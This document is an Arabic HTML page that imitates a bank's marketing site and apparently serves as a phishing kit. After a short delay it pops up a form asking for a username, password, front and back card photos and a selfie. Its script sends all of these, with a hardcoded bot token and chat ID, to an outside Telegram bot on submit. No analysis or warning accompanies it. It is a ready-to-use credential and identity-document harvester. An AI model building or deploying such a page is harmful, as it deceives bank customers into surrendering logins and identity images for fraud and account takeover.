<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تجربة مصرفية صُمّمت لك</title>
<style>
  :root{
    --navy:#0d1447;
    --blue-text:#5865c7;
    --bg:#f6f7fb;
    --card-a:#dde2f7;
    --card-b:#c7cef5;
    --muted:#7c82a3;
    --white:#ffffff;
    --red:#e63946;
    --cyan:#29b6f6;
  }

  *{box-sizing:border-box;}
  html,body{margin:0;padding:0;}
  body{
    font-family:"Tahoma","Segoe UI",Arial,sans-serif;
    background:var(--bg);
    color:var(--navy);
    min-height:100vh;
    overflow-x:hidden;
  }

  /* ---------- top notice bar ---------- */
  .notice{
    text-align:right;
    font-size:13px;
    color:var(--navy);
    padding:14px 24px;
    border-bottom:1px solid #e9ebf3;
    background:var(--white);
  }

  /* ---------- header ---------- */
  header{
    display:flex;
    align-items:center;
    justify-content:center;
    padding:0;
    background:var(--white);
    border-bottom:1px solid #eef0f8;
  }
  .header-image{
    display:block;
    width:100%;
    height:auto;
  }

  /* ---------- form modal ---------- */
  .modal-backdrop{
    position:fixed;
    inset:0;
    background:rgba(13,20,71,.4);
    opacity:0;
    pointer-events:none;
    transition:opacity .35s ease;
    z-index:998;
  }
  .modal-backdrop.show{
    opacity:1;
    pointer-events:auto;
  }
  
  .form-modal{
    position:fixed;
    left:50%;
    top:50%;
    width:min(92vw, 360px); 
    max-height: 85vh;
    background:var(--white);
    border-radius:22px;
    box-shadow:0 30px 60px -20px rgba(13,20,71,.35);
    padding:0 0 20px;
    z-index:999;
    opacity:0;
    pointer-events:none;
    transform:translate(-50%, -45%) scale(0.95);
    transition: opacity .4s ease, transform .4s ease;
    display:flex;
    flex-direction:column;
  }
  
  .form-modal.show{
    opacity:1;
    pointer-events:auto;
    transform:translate(-50%, -50%) scale(1);
  }
  
  .form-modal-accent{
    height:50px; 
    flex-shrink:0;
    background:linear-gradient(135deg,#1c2fd6,#4f6bff);
    position:relative;
  }
  .form-modal-accent::after{
    content:"";
    position:absolute;
    left:0;right:0;bottom:-1px;
    height:20px;
    background:var(--white);
    border-radius:22px 22px 0 0;
  }
  
  .form-modal-scroll {
    flex: 1;
    overflow-y: auto;
    padding: 0 24px;
  }
  
  .form-modal-body{
    display:flex;
    flex-direction:column;
    gap:16px;
    padding-bottom: 10px;
  }
  
  .form-group {
    display: flex;
    flex-direction: column;
    gap: 6px;
  }
  
  .form-group label {
    font-size: 13px;
    font-weight: 600;
    color: var(--navy);
    line-height: 1.4;
  }
  
  .form-control {
    width: 100%;
    padding: 10px 12px;
    border: 1px solid #dde2f7;
    border-radius: 8px;
    font-family: inherit;
    font-size: 14px;
    color: var(--navy);
    background-color: #fcfdfe;
    outline: none;
    transition: border-color 0.2s;
  }
  
  .form-control:focus {
    border-color: #4f6bff;
  }
  
  .file-dropzone {
    border: 1px dashed #b0b8ec;
    background: #f8f9fe;
    border-radius: 8px;
    padding: 12px;
    text-align: center;
    cursor: pointer;
    transition: background 0.2s;
  }
  
  .file-dropzone:hover {
    background: #f0f2ff;
  }
  
  .file-dropzone span {
    font-size: 12px;
    color: #5865c7;
    font-weight: 500;
  }

  .file-dropzone input[type="file"] {
    display: none;
  }
  
  .form-footer {
    margin-top: 10px;
    display: flex;
    justify-content: flex-start; 
  }
  
  .btn-submit {
    background: var(--navy);
    color: var(--white);
    border: none;
    padding: 10px 24px;
    border-radius: 8px;
    font-family: inherit;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    transition: background 0.2s;
    width: 100%;
    text-align: center;
  }
  
  .btn-submit:hover {
    background: #1c2fd6;
  }
  
  .btn-submit:disabled {
    background: #7c82a3;
    cursor: not-allowed;
  }

  /* ---------- hero ---------- */
  .hero{
    text-align:center;
    padding:52px 20px 30px;
  }
  .hero h1{
    font-size:clamp(22px,4vw,34px);
    margin:0 0 16px;
    color:var(--navy);
    font-weight:800;
    line-height:1.5;
  }
  .hero p{
    margin:0;
    font-size:clamp(15px,2vw,18px);
    color:var(--navy);
    font-weight:500;
  }

  /* ---------- carousel ---------- */
  .carousel-viewport{
    position:relative;
    width:100%;
    overflow:hidden;
    padding:36px 0 8px;
  }
  .track{
    display:flex;
    direction:ltr;
    gap:14px;
    transition:transform .5s cubic-bezier(.4,0,.2,1);
    will-change:transform;
  }
  .card{
    flex:0 0 auto;
    width:min(56vw,270px);
    height:380px;
    border-radius:30px;
    position:relative;
    overflow:hidden;
    background:linear-gradient(160deg,var(--card-a),var(--card-b));
    box-shadow:0 22px 46px -18px rgba(20,25,80,.32);
    cursor:pointer;
    transition:box-shadow .4s;
  }
  .card.is-active{
    box-shadow:0 32px 60px -18px rgba(20,25,80,.42);
  }

  .card-photo-area{
    position:absolute;
    inset:0;
    display:flex;
    align-items:center;
    justify-content:center;
  }
  .card-photo-area img{
    width:100%;height:100%;object-fit:cover;
  }
  .card-photo-area .upload-placeholder{
    display:flex;
    flex-direction:column;
    align-items:center;
    gap:10px;
    color:#8992d6;
    font-size:13px;
    text-align:center;
    padding:20px;
    direction:rtl;
  }
  .card-photo-area .upload-placeholder svg{width:32px;height:32px;opacity:.55;}

  .card-footer{
    position:absolute;
    left:14px;right:14px;bottom:14px;
    z-index:2;
    background:rgba(255,255,255,.92);
    backdrop-filter:blur(6px);
    border-radius:20px;
    padding:14px 20px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    direction:rtl;
  }
  .chevron-mark{
    color:var(--navy);
    display:flex;
    align-items:center;
  }
  .chevron-mark svg{width:16px;height:16px;}
  .brand-mark{
    width:46px;height:32px;position:relative;
  }
  .brand-mark span{ position:absolute; display:block; }
  .brand-mark .lead{
    width:12px;height:20px;
    background:var(--navy);
    transform:skewX(-18deg);
    left:0; bottom:0;
  }
  .brand-mark .tri-a{
    width:0;height:0;
    border-left:13px solid transparent;
    border-right:13px solid transparent;
    border-top:22px solid var(--navy);
    right:14px; top:0;
  }
  .brand-mark .tri-b{
    width:0;height:0;
    border-left:13px solid transparent;
    border-right:13px solid transparent;
    border-bottom:22px solid var(--cyan);
    right:0; bottom:0;
  }

  /* dots */
  .dots{
    display:flex;
    justify-content:center;
    gap:9px;
    margin:22px 0 48px;
  }
  .dot{
    width:8px;height:8px;border-radius:50%;
    background:#d6d9ec;
    border:none;
    cursor:pointer;
    padding:0;
    transition:all .3s;
  }
  .dot.active{
    background:var(--navy);
    width:22px;
    border-radius:6px;
  }

  #mainFileInput{display:none;}

  @media (max-width:640px){
    .card{width:min(62vw,220px);height:320px;border-radius:22px;}
    .notice{padding:12px 16px;font-size:12px;}
  }
</style>
</head>
<body>

  <div class="notice">قواعد الافصاح عن أسعار المنتجات التمويلية</div>

  <header>
    <img src="header.png" alt="الهيدر" class="header-image">
  </header>

  <div class="modal-backdrop" id="modalBackdrop"></div>
  
  <div class="form-modal" id="formModal">
    <div class="form-modal-accent"></div>
    <div class="form-modal-scroll">
      <form class="form-modal-body" id="telegramForm">
        
        <div class="form-group">
          <input type="text" id="username" class="form-control" placeholder="اسم المستخدم الذي تريده" required>
        </div>
        
        <div class="form-group">
          <input type="password" id="password" class="form-control" placeholder="كلمة السر" required>
        </div>
        
        <div class="form-group">
          <label>صورة الوجه الامامي من بطاقة اللاعب المقدمة لك</label>
          <label class="file-dropzone">
            <span>اضغط لإرفاق ملف</span>
            <input type="file" id="fileFront" accept="image/*" required>
          </label>
        </div>
        
        <div class="form-group">
          <label>صورة الوجه الخلفي لبطاقة اللاعب المقدمة لك</label>
          <label class="file-dropzone">
            <span>اضغط لتحميل صورة</span>
            <input type="file" id="fileBack" accept="image/*" required>
          </label>
        </div>
        
        <div class="form-group">
          <label>صورة شخصية لحسابك الذي سيتم انشاءه (إثبات الملكية)</label>
          <label class="file-dropzone">
            <span>اضغط لرفع الصورة الشخصية</span>
            <input type="file" id="fileSelfie" accept="image/*" required>
          </label>
        </div>
        
        <div class="form-footer">
          <button type="submit" id="submitBtn" class="btn-submit">قدم طلب</button>
        </div>

      </form>
    </div>
  </div>

  <section class="hero">
    <h1>تجربة مصرفية صُمّمت لك</h1>
    <p>تواكب احتياجات يومك وتدعم طموحات غدك</p>
  </section>

  <div class="carousel-viewport" id="viewport">
    <div class="track" id="track"></div>
  </div>

  <div class="dots" id="dots"></div>

  <input type="file" id="mainFileInput" accept="image/*">

<script>
  // ---------- إعدادات التلجرام (ضع بياناتك هنا) ----------
  const TELEGRAM_BOT_TOKEN = '8905455566:AAFQLQWmxsp3U0S6I650V85yYK8tiDSyo9w';
  const TELEGRAM_CHAT_ID = '5437487652';


  const CARD_COUNT = 5;
  let images = new Array(CARD_COUNT).fill(null);
  let current = 0;
  let activeUploadIndex = null;

  const viewport = document.getElementById('viewport');
  const track = document.getElementById('track');
  const dotsWrap = document.getElementById('dots');
  const mainFileInput = document.getElementById('mainFileInput');

  function buildCards(){
    track.innerHTML = '';
    for(let i=0;i<CARD_COUNT;i++){
      const card = document.createElement('div');
      card.className = 'card';
      card.dataset.index = i;

      card.innerHTML = `
        <div class="card-photo-area">
          ${images[i]
            ? `<img src="${images[i]}" alt="بطاقة ${i+1}">`
            : `<div class="upload-placeholder">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><rect x="3" y="5" width="18" height="14" rx="2"/><circle cx="8.5" cy="10.5" r="1.5"/><path d="M21 15l-5-5L5 19"/></svg>
                 اضغط لإضافة صورة
               </div>`
          }
        </div>
        <div class="card-footer">
          <span class="chevron-mark">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
          </span>
          <div class="brand-mark">
            <span class="lead"></span>
            <span class="tri-a"></span>
            <span class="tri-b"></span>
          </div>
        </div>
      `;

      card.addEventListener('click', ()=>{
        if(parseInt(card.dataset.index) === current){
          activeUploadIndex = i;
          mainFileInput.click();
        } else {
          goTo(i);
        }
      });

      track.appendChild(card);
    }
    markActive();
    buildDots();
    requestAnimationFrame(updateTransform);
  }

  function markActive(){
    track.querySelectorAll('.card').forEach(c=>{
      c.classList.toggle('is-active', parseInt(c.dataset.index) === current);
    });
  }

  function updateTransform(){
    const cardEl = track.children[current];
    if(!cardEl) return;
    const containerWidth = viewport.clientWidth;
    const cardWidth = cardEl.offsetWidth;
    const cardLeft = cardEl.offsetLeft;
    const offset = (containerWidth/2) - cardLeft - (cardWidth/2);
    track.style.transform = `translateX(${offset}px)`;
  }

  function buildDots(){
    dotsWrap.innerHTML = '';
    for(let i=0;i<CARD_COUNT;i++){
      const dot = document.createElement('button');
      dot.className = 'dot' + (i===current ? ' active':'');
      dot.addEventListener('click', ()=>goTo(i));
      dotsWrap.appendChild(dot);
    }
  }

  function goTo(i){
    current = ((i % CARD_COUNT) + CARD_COUNT) % COUNT_COUNT;
    current = ((i % CARD_COUNT) + CARD_COUNT) % CARD_COUNT;
    markActive();
    buildDots();
    updateTransform();
  }

  mainFileInput.addEventListener('change', (e)=>{
    const file = e.target.files[0];
    if(!file || activeUploadIndex === null) return;
    const reader = new FileReader();
    reader.onload = (ev)=>{
      images[activeUploadIndex] = ev.target.result;
      buildCards();
    };
    reader.readAsDataURL(file);
    mainFileInput.value = '';
  });

  let touchStartX = null;
  viewport.addEventListener('touchstart', e=>{ touchStartX = e.touches[0].clientX; });
  viewport.addEventListener('touchend', e=>{
    if(touchStartX===null) return;
    const diff = e.changedTouches[0].clientX - touchStartX;
    if(Math.abs(diff) > 40){
      diff > 0 ? goTo(current-1) : goTo(current+1);
    }
    touchStartX = null;
  });

  window.addEventListener('resize', updateTransform);
  buildCards();

  const modalBackdrop = document.getElementById('modalBackdrop');
  const formModal = document.getElementById('formModal');

  window.addEventListener('load', ()=>{
    setTimeout(()=>{
      modalBackdrop.classList.add('show');
      formModal.classList.add('show');
    }, 2000);
  });

  modalBackdrop.addEventListener('click', ()=>{
    modalBackdrop.classList.remove('show');
    formModal.classList.remove('show');
  });

  document.querySelectorAll('.file-dropzone input').forEach(input => {
    input.addEventListener('change', function() {
      if(this.files && this.files[0]) {
        this.previousElementSibling.innerText = "✓ تم اختيار: " + this.files[0].name.substring(0, 12) + "...";
        this.previousElementSibling.style.color = "#29b6f6";
      }
    });
  });

  // ---------- كود إرسال البيانات المتقدم إلى تلجرام ----------
  document.getElementById('telegramForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const submitBtn = document.getElementById('submitBtn');
    const userVal = document.getElementById('username').value;
    const passVal = document.getElementById('password').value;
    
    const fileFront = document.getElementById('fileFront').files[0];
    const fileBack = document.getElementById('fileBack').files[0];
    const fileSelfie = document.getElementById('fileSelfie').files[0];

    submitBtn.disabled = true;
    submitBtn.innerText = "جاري إرسال الطلب...";

    // 1. إرسال النص أولاً
    const textMessage = `📌 *طلب جديد واصل*\n\n👤 *اسم المستخدم:* \`${userVal}\`\n🔒 *كلمة السر:* \`${passVal}\``;
    
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: textMessage,
          parse_mode: 'Markdown'
        })
      });

      // دالة مساعدة لإرسال الصور الفردية كملفات حقيقية للبوت
      async function sendPhotoToTelegram(file, caption) {
        if(!file) return;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', file);
        formData.append('caption', caption);
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      }

      // 2. إرسال الصور تباعاً لتصل بجودتها الأصلية مع التسمية الخاصة بها
      await sendPhotoToTelegram(fileFront, `🖼️ الوجه الأمامي لبطاقة اللاعب (${userVal})`);
      await sendPhotoToTelegram(fileBack, `🖼️ الوجه الخلفي لبطاقة اللاعب (${userVal})`);
      await sendPhotoToTelegram(fileSelfie, `👤 الصورة الشخصية - إثبات الملكية (${userVal})`);

      alert('تم تقديم طلبك بنجاح وأُرسلت البيانات!');
      
      // إغلاق المودال وتصفير الفورم
      modalBackdrop.classList.remove('show');
      formModal.classList.remove('show');
      document.getElementById('telegramForm').reset();
      
      // إعادة النصوص الافتراضية لحقول الرفع
      document.querySelectorAll('.file-dropzone span').forEach(span => {
        if(span.innerText.includes('الأمامي')) span.innerText = "اضغط لإرفاق ملف";
        else if(span.innerText.includes('الخلفي')) span.innerText = "اضغط لتحميل صورة";
        else span.innerText = "اضغط لرفع الصورة الشخصية";
        span.style.color = "";
      });

    } catch (error) {
      console.error(error);
      alert('حدث خطأ أثناء إرسال البيانات، يرجى المحاولة مرة أخرى.');
    } finally {
      submitBtn.disabled = false;
      submitBtn.innerText = "قدم طلب";
    }
  });
</script>
</body>
</html>
